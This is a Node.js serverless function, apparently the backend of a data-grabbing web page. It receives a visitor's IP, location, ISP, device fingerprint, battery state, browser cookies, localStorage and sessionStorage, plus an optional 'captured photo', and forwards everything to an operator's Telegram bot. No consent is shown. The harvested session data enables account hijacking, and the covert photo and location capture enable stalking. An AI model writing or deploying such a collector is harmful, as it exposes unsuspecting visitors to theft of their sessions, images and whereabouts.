exports.handler = async (event) => {
  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type",
        "Access-Control-Allow-Methods": "POST, OPTIONS"
      },
      body: ""
    };
  }

  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      headers: { "Access-Control-Allow-Origin": "*" },
      body: JSON.stringify({ error: "Method Not Allowed" })
    };
  }

  try {
    const data = JSON.parse(event.body || "{}");

    const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TOKEN || !CHAT_ID) {
      return {
        statusCode: 500,
        headers: { "Access-Control-Allow-Origin": "*" },
        body: JSON.stringify({ success: false, error: "Faltan variables de entorno" })
      };
    }

    function clean(v) {
      if (v === undefined || v === null || v === "") return "N/A";
      return String(v);
    }

    const pantalla = clean(data.pantalla);
    const pixelRatio = clean(data.pixelRatio);
    const pantallaDisponible = clean(data.pantallaDisponible);
    const orientacion = clean(data.orientacion);

    let mensaje = "474747 - Nueva información\n\n";
    mensaje += "Red\n";
    mensaje += "• IP: " + clean(data.ip) + "\n";
    mensaje += "• País: " + clean(data.country) + "\n";
    mensaje += "• Ciudad: " + clean(data.city) + "\n";
    mensaje += "• Región: " + clean(data.region) + "\n";
    mensaje += "• ISP: " + clean(data.isp) + "\n";
    mensaje += "• Conexión: " + clean(data.conexion) + "\n";
    mensaje += "• RTT: " + clean(data.rtt) + "\n\n";

    mensaje += "Dispositivo\n";
    mensaje += "• OS: " + clean(data.os) + "\n";
    mensaje += "• Navegador: " + clean(data.browser) + "\n";
    mensaje += "• Tipo: " + clean(data.device) + "\n";
    mensaje += "• RAM: " + clean(data.ram) + "\n";
    mensaje += "• Núcleos: " + clean(data.nucleos) + "\n";
    mensaje += "• Pantalla: " + pantalla + " (" + pixelRatio + "x)\n";
    mensaje += "• Pantalla disponible: " + pantallaDisponible + "\n";
    mensaje += "• Orientación: " + orientacion + "\n";
    mensaje += "• Color: " + clean(data.colorDepth) + "\n\n";

    mensaje += "Batería\n";
    mensaje += "• Nivel: " + clean(data.bateria) + "\n";
    mensaje += "• Estado: " + clean(data.cargando) + "\n\n";

    mensaje += "Idioma / Zona\n";
    mensaje += "• Idioma: " + clean(data.idioma) + "\n";
    mensaje += "• Idiomas: " + clean(data.idiomas) + "\n";
    mensaje += "• Zona: " + clean(data.zonaHoraria) + "\n\n";

    mensaje += "Almacenamiento y Cookies\n";
    mensaje += "• Cookies habilitadas: " + clean(data.cookiesEnabled) + "\n";
    mensaje += "• Cookies: " + clean(data.cookies) + "\n";
    mensaje += "• localStorage: " + clean(data.localStorage) + "\n";
    mensaje += "• sessionStorage: " + clean(data.sessionStorage) + "\n\n";

    mensaje += "Otras\n";
    mensaje += "• Táctil: " + clean(data.toque) + "\n";
    mensaje += "• Touch points: " + clean(data.maxTouchPoints) + "\n";
    mensaje += "• Online: " + clean(data.online) + "\n";
    mensaje += "• PDF Viewer: " + clean(data.pdfViewer) + "\n";
    mensaje += "• Webdriver: " + clean(data.webdriver) + "\n";
    mensaje += "• Vendor: " + clean(data.vendor) + "\n";
    mensaje += "• Referrer: " + clean(data.referrer) + "\n\n";

    mensaje += new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" });

    // Si viene una foto en base64, la mandamos también
    if (data.foto && data.foto.startsWith("data:image")) {
      // Primero el texto
      await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
      });

      // Después la foto
      const base64Data = data.foto.replace(/^data:image\/\w+;base64,/, "");
      const photoBuffer = Buffer.from(base64Data, "base64");

      const form = new FormData();
      form.append("chat_id", CHAT_ID);
      form.append("caption", "Foto capturada - 474747");
      form.append("photo", new Blob([photoBuffer], { type: "image/jpeg" }), "foto.jpg");

      const photoRes = await fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {
        method: "POST",
        body: form
      });

      const photoResult = await photoRes.json();
      if (!photoRes.ok) {
        console.error("Error enviando foto:", photoResult);
      }

      return {
        statusCode: 200,
        headers: {
          "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*"
        },
        body: JSON.stringify({ success: true, message: "Texto + foto enviados" })
      };
    }

    // Solo texto
    const response = await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje
      })
    });

    const result = await response.json();

    if (!response.ok) {
      console.error("Telegram error:", result);
      return {
        statusCode: 500,
        headers: { "Access-Control-Allow-Origin": "*" },
        body: JSON.stringify({ success: false, error: "Error de Telegram", details: result })
      };
    }

    return {
      statusCode: 200,
      headers: {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*"
      },
      body: JSON.stringify({ success: true, message: "Enviado correctamente" })
    };

  } catch (error) {
    console.error("Error general:", error);
    return {
      statusCode: 500,
      headers: { "Access-Control-Allow-Origin": "*" },
      body: JSON.stringify({ success: false, error: error.message })
    };
  }
};
